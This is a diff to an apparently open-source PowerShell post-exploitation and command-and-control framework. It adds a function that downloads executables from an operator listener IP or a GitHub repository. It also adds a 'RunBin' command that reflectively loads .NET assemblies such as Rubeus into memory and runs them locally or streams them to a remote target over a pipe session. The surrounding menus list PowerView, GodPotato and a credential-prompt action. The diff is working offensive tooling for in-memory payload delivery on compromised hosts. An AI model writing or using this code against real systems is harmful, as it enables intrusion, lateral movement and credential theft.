@@ -348,6 +348,30 @@ function Fetch-ToolFromGitHub {
     return $false
 }
 
+function Fetch-BinaryTool {
+    param([string]$ToolName)
+    if ($global:ToolCache.ContainsKey($ToolName)) { return $true }
+    $exts = @('.exe', '.dll')
+    $urls = @()
+    foreach ($ext in $exts) {
+        if ($global:ListenerIP) { $urls += "http://$($global:ListenerIP):8080/$ToolName$ext" }
+        $urls += "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/$ToolName$ext"
+    }
+    foreach ($url in $urls) {
+        try {
+            Write-Output " [*] Fetching binary '$ToolName' from $url ..."
+            $bytes = (New-Object Net.WebClient).DownloadData($url)
+            if ($bytes -and $bytes.Length -gt 0) {
+                $global:ToolCache[$ToolName] = [Convert]::ToBase64String($bytes)
+                Write-Output " [+] '$ToolName' binary cached ($($bytes.Length) bytes)."
+                return $true
+            }
+        } catch { }
+    }
+    Write-Output " [-] Could not fetch binary '$ToolName' from operator server or GitHub."
+    return $false
+}
+
 function New-EmbeddedTool {
     param([string]$Path, [string]$Name)
     $bytes = [System.Text.Encoding]::UTF8.GetBytes((Get-Content $Path -Raw -Encoding UTF8))
@@ -1805,6 +1829,7 @@ function Start-LocalShell {
             Write-Output "   PowerView          Load PowerView - use: Get-Domain, Find-DomainUser, etc."
             Write-Output "   Rubeus             Load Rubeus - use: Rubeus -Command ""triage"""
             Write-Output "   TLS                Enable TLS 1.2 for this session"
+            Write-Output "   RunBin <name>      Reflectively load .NET assembly from cache/server - use: RunBin Rubeus.exe triage"
             Write-Output ""
             Write-Output " [+] Local Actions:"
             Write-Output "   Ask4Creds          Prompt user for credentials"
@@ -1917,6 +1942,39 @@ function Start-LocalShell {
                 }
             } else {
                 Write-Output " [-] '$modName' not in cache or GitHub."
+            }
+            continue
+        }
+
+        # ── RunBin: reflective .NET assembly load ────────────────────────────
+        if ($cmd -match '^RunBin\s+(\S+)(.*)') {
+            $binName = $Matches[1].Trim()
+            $binArgs = $Matches[2].Trim() -split '\s+' | Where-Object { $_ -ne '' }
+            $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $binName } | Select-Object -First 1
+            if (-not $cacheKey) {
+                if (Fetch-BinaryTool -ToolName $binName) { $cacheKey = $binName }
+            }
+            if ($cacheKey) {
+                try {
+                    $bytes = [Convert]::FromBase64String($global:ToolCache[$cacheKey])
+                    $asm   = [Reflection.Assembly]::Load($bytes)
+                    $ep    = $asm.EntryPoint
+                    if ($ep) {
+                        Write-Output " [+] Invoking $binName ..."
+                        $epParams = $ep.GetParameters()
+                        if ($epParams.Count -gt 0) {
+                            $ep.Invoke($null, @(,[string[]]$binArgs))
+                        } else {
+                            $ep.Invoke($null, $null)
+                        }
+                    } else {
+                        Write-Output " [-] No entry point found in '$binName'. Use 'load $binName' for DLLs."
+                    }
+                } catch {
+                    Write-Output " [-] RunBin failed: $($_.Exception.Message)"
+                }
+            } else {
+                Write-Output " [-] '$binName' not available. Ensure it is on the operator server or in Tools\."
             }
             continue
         }
@@ -3321,6 +3379,32 @@ function InteractWithPipeSession{
 				} else {
 					Write-Output " [-] GodPotato not in cache. Add Invoke-GodPotato.ps1 to Tools\ and run: modules reload"
 				}
+			}
+		}
+
+		elseif ($command -match '^RunBin\s+(\S+)(.*)') {
+			$binName = $Matches[1].Trim()
+			$binArgs = $Matches[2].Trim()
+			$cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $binName } | Select-Object -First 1
+			if (-not $cacheKey) {
+				if (Fetch-BinaryTool -ToolName $binName) { $cacheKey = $binName }
+			}
+			if ($cacheKey) {
+				Write-Output " [+] Streaming $binName to target..."
+				if (Send-Module -ToolName $cacheKey -Writer $sw -Reader $sr) {
+					$invokeCmd = if ($binArgs) {
+						"[AppDomain]::CurrentDomain.GetAssemblies()|?{`$_.GetName().Name -eq '$([System.IO.Path]::GetFileNameWithoutExtension($binName))'}|Select-Object -Last 1|%{`$_.EntryPoint.Invoke(`$null,@(,[string[]]('$binArgs'-split ' ')))}"
+					} else {
+						"[AppDomain]::CurrentDomain.GetAssemblies()|?{`$_.GetName().Name -eq '$([System.IO.Path]::GetFileNameWithoutExtension($binName))'}|Select-Object -Last 1|%{`$_.EntryPoint.Invoke(`$null,`$null)}"
+					}
+					Write-Output " [+] $binName loaded -- executing on target..."
+					$sw.WriteLine($invokeCmd)
+					$sw.Flush()
+				} else {
+					Write-Output " [-] Failed to stream '$binName' to target."
+				}
+			} else {
+				Write-Output " [-] '$binName' not available. Ensure it is on the operator server or in Tools\."
 			}
 		}
 
@@ -6351,6 +6435,7 @@ function Get-AvailableCommands  {
 	Write-Output " PowerView          Load PowerView"
 	Write-Output " Rubeus             Load Rubeus"
 	Write-Output " TLS                Enable TLS 1.2"
+	Write-Output " RunBin <name>      Reflectively load .NET assembly on target - use: RunBin Rubeus.exe triage"
 	Write-Output ""
 	Write-Output ""
 	Write-Output " [+] Local Actions:"
